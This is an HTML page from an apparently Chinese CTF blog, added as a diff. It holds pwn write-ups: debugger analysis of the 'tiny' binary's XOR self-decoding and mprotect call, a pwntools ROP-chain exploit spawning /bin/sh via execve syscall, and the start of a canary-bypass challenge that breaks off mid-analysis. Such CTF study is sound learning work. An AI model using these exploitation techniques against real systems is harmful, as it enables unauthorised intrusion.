@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080b10">
+  
+  <title>pwn--tiny--XOR解码 · whymm</title>
+  <meta name="description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta name="author" content="whymm">
+  <meta name="keywords" content="Pwn,pwntools,shellcode,XOR,ret2libc,canary,Pwn">
+  <link rel="canonical" href="https://whymm.com.cn/2026/11/20/pwn-tiny-xor/">
+  <link rel="alternate" type="application/atom+xml" title="pwn--tiny--XOR解码 · whymm" href="/atom.xml">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="pwn--tiny--XOR解码 · whymm">
+  <meta property="og:description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta property="og:site_name" content="whymm">
+  <meta property="og:url" content="https://whymm.com.cn/2026/11/20/pwn-tiny-xor/">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:image" content="https://whymm.com.cn/img/og.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:alt" content="pwn--tiny--XOR解码 · whymm">
+  
+  <meta property="article:published_time" content="2026-11-20T15:00:00.000Z">
+  <meta property="article:modified_time" content="2026-11-22T09:16:57.244Z">
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="pwn--tiny--XOR解码 · whymm">
+  <meta name="twitter:description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta name="twitter:image" content="https://whymm.com.cn/img/og.png">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23080b10'/%3E%3Cpath d='M8 21l4.2-11 3.8 8.2 3.8-8.2L24 21' stroke='%2335e0a1' stroke-width='2.6' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="/css/post.css">
+  <script>
+    (function () {
+      try {
+        var t = localStorage.getItem('whymm-theme');
+        if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+      } catch (e) {}
+    })();
+  </script>
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="is-post">
+  <div class="bg-grid" aria-hidden="true"></div>
+  <div class="progress" id="progressBar" aria-hidden="true"></div>
+  <header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="/">
+      <span class="brand-mark" aria-hidden="true">W</span>
+      <span class="brand-name">whymm</span>
+      <span class="brand-caret" aria-hidden="true">_</span>
+    </a>
+
+    <nav class="nav" id="siteNav" aria-label="主导航">
+      
+      <a class="nav-link" href="/">首页</a>
+      
+      <a class="nav-link" href="/archives/">归档</a>
+      
+      <a class="nav-link" href="/categories/">分类</a>
+      
+      <a class="nav-link" href="/tags/">标签</a>
+      
+      <a class="nav-link" href="/about/">关于</a>
+      
+    </nav>
+
+    <div class="header-actions">
+      
+      <button class="icon-btn" id="searchBtn" type="button" aria-label="搜索（Ctrl+K）">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
+      </button>
+      
+      
+      <button class="icon-btn theme-toggle" id="themeBtn" type="button" aria-label="切换明暗主题">
+        <svg class="i-moon" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.8A9 9 0 1111.2 3a7 7 0 009.8 9.8z"/></svg>
+        <svg class="i-sun" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+      </button>
+      
+      <button class="icon-btn nav-btn" id="navBtn" type="button" aria-label="打开菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+
+  <main class="site-main">
+<article class="post">
+  <div class="wrap post-wrap">
+    <header class="post-header">
+      <div class="breadcrumb">
+        <a href="/">~</a>
+        <span>/</span>
+        
+        <a href="/categories/Pwn/">Pwn</a>
+        <span>/</span>
+        
+        <span class="breadcrumb-current">pwn--tiny--XOR解码</span>
+      </div>
+      <h1 class="post-title">pwn--tiny--XOR解码</h1>
+      <div class="post-meta">
+        <span class="post-meta-item">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3.5" y="5" width="17" height="16" rx="2.5"/><path d="M8 3v4M16 3v4M3.5 10h17"/></svg>
+          <time datetime="2026-11-20T15:00:00.000Z">2026-11-20</time>
+        </span>
+        <span class="post-meta-item">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7.5V12l3 2"/></svg>
+          19 分钟阅读
+        </span>
+        <span class="post-meta-item">7512 字</span>
+        
+        
+        <span class="post-meta-item post-author">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="3.6"/><path d="M4.5 20c1.2-3.6 4-5.4 7.5-5.4s6.3 1.8 7.5 5.4"/></svg>
+          wu_m1ng
+        </span>
+        
+        
+        <span class="post-meta-item" id="busuanzi_container_page_pv" style="display:none">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-6.5 10-6.5S22 12 22 12s-3.6 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="2.6"/></svg>
+          <span id="busuanzi_value_page_pv">0</span> 次阅读
+        </span>
+        
+        
+        <a class="chip chip-cat" href="/categories/Pwn/" style="--c: #ff5c7a">Pwn</a>
+        
+      </div>
+    </header>
+
+    <div class="post-layout">
+      <div class="post-main">
+        
+        <details class="toc-mobile">
+          <summary>目录</summary>
+          <div class="toc-mobile-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E2%80%93tiny%E2%80%93XOR%E8%A7%A3%E7%A0%81"><span class="toc-text">pwn–tiny–XOR解码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93ret2libc%E2%80%93canary%E7%BB%95%E8%BF%87"><span class="toc-text">pwn–ret2libc–canary绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-text">阅读题目信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-text">检查保护机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93rop-ret2text"><span class="toc-text">pwn–rop+ret2text</span></a></li></ol></li></ol></div>
+        </details>
+        
+
+        <div class="post-content" id="postContent"><h1 id="pwn–tiny–XOR解码"><a href="#pwn–tiny–XOR解码" class="headerlink" title="pwn–tiny–XOR解码"></a>pwn–tiny–XOR解码</h1><p>远程环境保证无额外参数启动<code>./tiny</code>，即<code>argc==1</code></p>
+<p>如果没有头绪，不妨跟着gdb完整走一遍程序</p>
+<p>根据提示要跟着gdb跑一遍</p>
+<p>先检查保护机制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xiaowu@localhost:~/Downloads/pwn-tiny-elf$ pwn checksec tiny</span><br><span class="line">[*] <span class="string">&#x27;/home/xiaowu/Downloads/pwn-tiny-elf/tiny&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>栈可执行且存在可读、可写、可执行的内存段</p>
+<p>拖进IDA</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sub_400030    LOAD</span><br><span class="line">start         LOAD</span><br><span class="line">sub_40008F    LOAD</span><br><span class="line">sub_40012D    LOAD</span><br><span class="line">sub_400148    LOAD</span><br><span class="line">sub_4001D2    LOAD</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public start</span><br><span class="line">start proc near</span><br><span class="line">inc      eax</span><br><span class="line">start endp</span><br></pre></td></tr></table></figure>
+
+<p>可以知道没有什么信息</p>
+<p>在gdb中动态调试一下</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">0x00000000004001ad in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────[ REGISTERS ]─────</span><br><span class="line"> RAX  0xfffffffffffffe00</span><br><span class="line"> RBX  0</span><br><span class="line"> RCX  0x4001ad  ← lea rsi, [rip - 0x9a]</span><br><span class="line"> RDX  0x66</span><br><span class="line"> RDI  0</span><br><span class="line"> RSI  0x7fffffffdce8 ← 0</span><br><span class="line"> R8   0x400125  ← 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class="line"> R9   0</span><br><span class="line"> R10  0xa</span><br><span class="line"> R11  0x206</span><br><span class="line"> R12  0</span><br><span class="line"> R13  0</span><br><span class="line"> R14  0</span><br><span class="line"> R15  0x7fffffffdce0 → 0x40019c ← xor rax, rax</span><br><span class="line"> RBP  0</span><br><span class="line"> RSP  0x7fffffffdce8 ← 0</span><br><span class="line"> RIP  0x4001ad  ← lea rsi, [rip - 0x9a]</span><br><span class="line">────────────────────────</span><br><span class="line">   0x4001a6       mov    edx, cs</span><br><span class="line">   0x4001a8       imul   edx, edx, 2</span><br><span class="line">   0x4001ab       syscall</span><br><span class="line"> ► 0x4001ad       lea    rsi, [rip - 0x9a]        RSI =&gt; 0x40011a ← outsd dx, dword ptr [rsi]</span><br><span class="line">   0x4001b4       mov    rax, 1</span><br><span class="line">   0x4001bb       mov    edx, 9</span><br><span class="line">   0x4001c0       mov    rdi, rax                  RDI =&gt; 1</span><br><span class="line">   0x4001c3       syscall &lt;SYS_write&gt;</span><br><span class="line">   0x4001c5       xor    edi, edi                  EDI =&gt; 0</span><br><span class="line">   0x4001c7       xor    rsi, rsi                  RSI =&gt; 0</span><br><span class="line">   0x4001ca       xor    rdx, rdx                  RDX =&gt; 0</span><br><span class="line">────────────────────────</span><br><span class="line">00:0000│ rsi rsp  0x7fffffffdce8 ← 0</span><br><span class="line">... ↓              5 skipped</span><br><span class="line">06:0030│          0x7fffffffdd18 → 0x400141 ← call 0x4001d2</span><br><span class="line">07:0038│          0x7fffffffdd20 ← 1</span><br><span class="line">────────────────────────</span><br><span class="line">► 0 0x4001ad</span><br><span class="line">  1 0x0</span><br><span class="line">────────────────────────</span><br><span class="line">Program received signal SIGINT</span><br><span class="line"></span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
+
+<p>发现</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R8   0x400125  ← 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br></pre></td></tr></table></figure>
+
+<p>得到了&#x2F;bin&#x2F;sh的地址</p>
+<p>且前面调用了syscall，查看一下前面的汇编</p>
+<p><code>imul edx, edx, 0x2</code>：把代码段寄存器 CS 的值放入 EDX，再乘以 2。</p>
+<p>CS 通常为 0x33，故一共读取102字节</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/12i 0x40019c</span><br><span class="line">   0x40019c:    xor    rax,rax</span><br><span class="line">   0x40019f:    xor    rdi,rdi</span><br><span class="line">   0x4001a2:    lea    rsi,[r15+0x8]</span><br><span class="line">   0x4001a6:    mov    edx,cs</span><br><span class="line">   0x4001a8:    imul   edx,edx,0x2</span><br><span class="line">   0x4001ab:    syscall</span><br></pre></td></tr></table></figure>
+
+<p>总结：这段代码是在调用 read(0, R15+8, 102)</p>
+<p>所以我们要找R15的真实值，以及这个缓冲区与返回地址之间的距离</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r15     0x7fffffffdce0     0x7fffffffdce0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsi rsp  0x7fffffffdce8 ← 0</span><br><span class="line">... ↓              5 skipped</span><br><span class="line">06:0030│          0x7fffffffdd18 → 0x400141 ← call 0x4001d2</span><br></pre></td></tr></table></figure>
+
+<p>由图可以得到偏移量为0x30，即48、</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x400030:    syscall</span><br></pre></td></tr></table></figure>
+
+<p>又发现又syscall，故可以通过调用syscall来得到shell</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004000a1 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x400123:    pop    rax</span><br><span class="line">0x400124:    ret</span><br></pre></td></tr></table></figure>
+
+<p>找到设置rdi和rax的地址，构造一个syscall的rop链</p>
+<p>攻击脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">35627</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Do you want to say something to me?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">48</span></span><br><span class="line">payload += p64(<span class="number">0x40000a</span>)</span><br><span class="line">payload += p64(<span class="number">0x400125</span>)</span><br><span class="line">payload += p64(<span class="number">0x400123</span>)</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(<span class="number">0x400030</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload length:&quot;</span>, <span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>本题核心：xor解码</p>
+<p>用starti开始，再查看10条rip</p>
+<p><code>inc</code>：+1</p>
+<p><code>jne</code>：Jump if Not Equal，条件不相等时跳转。</p>
+<ul>
+<li>它检查零标志 ZF。</li>
+<li>如果 ZF&#x3D;0，就跳到 0x400134。</li>
+<li>如果 ZF&#x3D;1，就继续执行后面的指令。</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i $rip</span><br><span class="line">=&gt; 0x40008d:    inc    eax</span><br><span class="line">   0x40008f:    mov    r10d,0xa</span><br><span class="line">   0x400095:    cs jne 0x400134</span><br><span class="line">   0x40009c:    call   0x40008f</span><br><span class="line">   0x4000a1:    pop    rdi</span><br><span class="line">   0x4000a2:    ret</span><br><span class="line">   0x4000a3:    or     ah,BYTE PTR [rdi]</span><br><span class="line">   0x4000a5:    cs cs sub eax,0x2d302462</span><br><span class="line">   0x4000ac:    (bad)</span><br><span class="line">   0x4000ad:    (bad)</span><br></pre></td></tr></table></figure>
+
+<p>跳转后查看指令</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20i $rip</span><br><span class="line">=&gt; 0x400134:    mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x400138:    and    rsp,0xfffffffffffffff0</span><br><span class="line">   0x40013c:    call   0x400148</span><br><span class="line">   0x400141:    call   0x4001d2</span><br><span class="line">   0x400146:    ud2</span><br><span class="line">   0x400148:    sub    rsp,0x30</span><br><span class="line">   0x40014c:    mov    rdi,rax</span><br><span class="line">   0x40014f:    lea    r8,[rip+0xffffffffffffff4b]    # 0x4000a1</span><br><span class="line">   0x400156:    mov    r9d,0x84</span><br><span class="line">   0x40015c:    mov    cl,0x42</span><br><span class="line">   0x40015e:    xor    BYTE PTR [r8],cl</span><br><span class="line">   0x400161:    inc    r8</span><br><span class="line">   0x400164:    dec    r9d</span><br><span class="line">   0x400167:    jne    0x40015e</span><br><span class="line">   0x400169:    lea    rsi,[rip+0xffffffffffffff33]    # 0x4000a3</span><br><span class="line">   0x400170:    mov    edx,0x77</span><br><span class="line">   0x400175:    call   0x400030</span><br><span class="line">   0x40017a:    lea    rdi,[rip+0x0]    # 0x400181</span><br><span class="line">   0x400181:    and    rdi,0xfffffffffffff000</span><br><span class="line">   0x400188:    mov    esi,0x1000</span><br></pre></td></tr></table></figure>
+
+<p><code>mov r9d,0x84</code>：把0x84放入R9D，即处理132字节（这里的R9D是计数器，记录还剩多少字节需要处理）</p>
+<p><code>mov cl,0x42</code>：把0x42放入CL，作为XOR密钥，每个字节都会与0x42做异或运算</p>
+<p><code>xor BYTE PTR [r8],cl</code>：修改内存的指令</p>
+<p><code>dec</code>：-1（计数器减到零时，ZF 就会被设置为 1）</p>
+<p>xor解码的范围：起始地址：<code>0x4000a1</code><br>结束地址：<code>0x400124</code></p>
+<p>查看结束前的汇编指令</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x400123:    pop    rax</span><br><span class="line">0x400124:    ret</span><br></pre></td></tr></table></figure>
+
+<p>可用来构造rop链</p>
+<p>接着往下分析</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8i $rip</span><br><span class="line">=&gt; 0x400170:    mov    edx,0x77</span><br><span class="line">   0x400175:    call   0x400030</span><br><span class="line">   0x40017a:    lea    rdi,[rip+0x0]    # 0x400181</span><br><span class="line">   0x400181:    and    rdi,0xfffffffffffff000</span><br><span class="line">   0x400188:    mov    esi,0x1000</span><br><span class="line">   0x40018d:    mov    edx,0x5</span><br><span class="line">   0x400192:    mov    eax,r10d</span><br><span class="line">   0x400195:    syscall</span><br><span class="line">pwndbg&gt; ni</span><br></pre></td></tr></table></figure>
+
+<p>调用mprotect</p>
+<table>
+<thead>
+<tr>
+<th>寄存器</th>
+<th>值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RAX</td>
+<td>10</td>
+<td><code>mprotect</code> 的系统调用编号</td>
+</tr>
+<tr>
+<td>RDI</td>
+<td>0x400000</td>
+<td>要修改权限的内存页起始地址</td>
+</tr>
+<tr>
+<td>RSI</td>
+<td>0x1000</td>
+<td>修改范围为 4096 字节</td>
+</tr>
+<tr>
+<td>RDX</td>
+<td>5</td>
+<td>设置为可读、可执行</td>
+</tr>
+</tbody></table>
+<p>把 0x400000 开始的 4096 字节内存区域设置为可读、可执行，但不可写。</p>
+<h2 id="pwn–ret2libc–canary绕过"><a href="#pwn–ret2libc–canary绕过" class="headerlink" title="pwn–ret2libc–canary绕过"></a>pwn–ret2libc–canary绕过</h2><h3 id="阅读题目信息"><a href="#阅读题目信息" class="headerlink" title="阅读题目信息"></a>阅读题目信息</h3><blockquote>
+<p><strong>cosmic-ray-1</strong></p>
+<p><code>./pwn</code>本身无法直接完成利用</p>
+<p>服务器会复制 <code>./pwn</code>，按你的“宇宙射线”改变<strong>一个字节</strong>，运行补丁后的程序，把该进程的 <code>/proc/&lt;pid&gt;/maps</code> 发给你，最后把你发送的 <strong>exp</strong>（十六进制字节串）作为输入喂给它。</p>
+<p>要求：</p>
+<ol>
+<li>给出一个<strong>文件偏移</strong>（十六进制）和一个<strong>单字节</strong>机器码（十六进制）；</li>
+<li>再给出一段 <strong>exp</strong>（十六进制）；</li>
+<li>让打了该补丁后的程序输出 flag。</li>
+</ol>
+<p>（AwdPwnPatcher真的很好用，推荐学习）</p>
+<p><strong>交互模式</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[1/1] Enter patch location (hex file offset): &lt;hex&gt;</span><br><span class="line">[1/1] Enter patch machine code (hex byte): &lt;hex byte&gt;</span><br><span class="line">&lt;... 子进程 maps ...&gt;</span><br><span class="line">[1/1] Enter exp (hex): &lt;hex payload&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过后会收到 <code>Well Done.</code>和flag。</p>
+<p><strong>附件</strong></p>
+<ul>
+<li><code>pwn</code>：目标程序，IBT&#x2F;SHSTK未实际启用</li>
+<li><code>libc.so.6</code>、<code>ld-linux-x86-64.so.2</code>：与线上一致</li>
+<li><code>solve.py</code>：解题模板，补全 <code>ROUNDS</code> 和 <code>build_payload</code> 即可</li>
+</ul>
+<p><strong>运行</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 solve.py</span><br><span class="line">python3 solve.py remote &lt;host&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure></blockquote>
+<h3 id="检查保护机制"><a href="#检查保护机制" class="headerlink" title="检查保护机制"></a>检查保护机制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xiaowu@localhost:~/Downloads/pwn-cosmic-ray-1$ pwn checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/xiaowu/Downloads/pwn-cosmic-ray-1/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>拖进IDA</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s: <span class="string">&quot;Haha, you can never bypass canary!&quot;</span>);</span><br><span class="line">  read(fd: <span class="number">0</span>, buf, nbytes: <span class="number">0xF0u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读取240个字节，存在溢出，且从题目的话来看要绕过canary</p>
+<p>再看一下汇编指令</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">buf= byte ptr -60h</span><br><span class="line">var_8= qword ptr -8</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">endbr64</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 60h</span><br><span class="line">mov     rax, fs:28h</span><br><span class="line">mov     [rbp+var_8], rax</span><br><span class="line">xor     eax, eax</span><br><span class="line">lea     rax, msg_0        ; &quot;Haha, you can never bypass canary!&quot;</span><br><span class="line">mov     rdi, rax          ; s</span><br><span class="line">call    _puts</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 0F0h         ; nbytes</span><br><span class="line">mov     rsi, rax          ; buf</span><br><span class="line">mov     edi, 0            ; fd</span><br><span class="line">call    _read</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     rdx, [rbp+var_8]</span><br><span class="line">sub     rdx, fs:28h</span><br><span class="line">jz      short locret_1216</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    __stack_chk_fail</span><br></pre></td></tr></table></figure>
+
